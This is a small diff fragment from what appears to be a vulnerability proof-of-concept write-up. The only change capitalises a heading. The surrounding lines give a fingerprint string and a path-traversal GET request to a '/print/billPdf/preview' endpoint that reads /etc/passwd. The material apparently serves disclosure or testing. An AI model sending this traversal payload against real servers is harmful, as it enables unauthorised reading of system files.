@@ -8,7 +8,7 @@
 body="js/npm.echarts.js"
 ```
 
-## poc
+## POC
 
 ```
 GET /print/billPdf/preview?urlPath=../../../../../../../../../../../../../../etc/passwd HTTP/1.1
